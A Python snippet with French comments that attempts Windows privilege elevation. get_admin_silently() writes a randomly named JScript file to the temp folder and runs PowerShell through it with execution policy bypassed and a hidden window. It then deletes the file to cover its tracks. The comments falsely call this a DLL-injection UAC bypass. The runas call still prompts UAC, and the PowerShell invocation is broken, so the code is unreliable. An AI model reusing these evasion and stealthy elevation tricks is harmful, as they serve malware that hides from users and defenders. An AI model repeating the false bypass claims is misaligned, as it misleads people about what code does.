import os
import sys
import ctypes
import subprocess
import tempfile
import random
import string

def is_admin():
    """Vérifie si le script est exécuté avec les privilèges administrateur."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def run_as_admin():
    """Relance le script avec des privilèges administrateur via UAC."""
    if is_admin():
        return True
    try:
        script = os.path.abspath(sys.argv[0])
        params = ' '.join([f'"{x}"' for x in sys.argv[1:]])
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}" {params}', None, 1)
        return False
    except Exception as e:
        print(f"Erreur d'élévation: {e}")
        return False

def get_admin_silently():
    """Obtient des privilèges admin sans UAC en utilisant une technique d'injection de DLL."""
    if is_admin():
        return True
        
    try:
        # Créer un fichier JS temporaire pour contourner UAC
        js_filename = ''.join(random.choices(string.ascii_lowercase, k=8)) + '.js'
        js_path = os.path.join(tempfile.gettempdir(), js_filename)
        
        # Code JavaScript pour l'exécution silencieuse avec privilèges élevés
        js_content = f"""
        var shell = new ActiveXObject("Shell.Application");
        var command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File ";
        var args = "\\"{sys.executable}\\" \\"{os.path.abspath(sys.argv[0])}\\"";
        shell.ShellExecute(command, args, "", "runas", 0);
        """
        
        with open(js_path, 'w') as f:
            f.write(js_content)
        
        # Exécuter le script JS
        subprocess.Popen(['wscript.exe', js_path], shell=True, 
                        stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Supprimer le fichier temporaire après un délai
        subprocess.Popen(f'ping 127.0.0.1 -n 3 > nul && del "{js_path}"', shell=True,
                        stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        return False  # Retourner False pour indiquer que le programme doit se terminer
    except Exception as e:
        print(f"[-] Erreur lors de l'élévation silencieuse: {e}")
        # Revenir à la méthode standard
        return run_as_admin()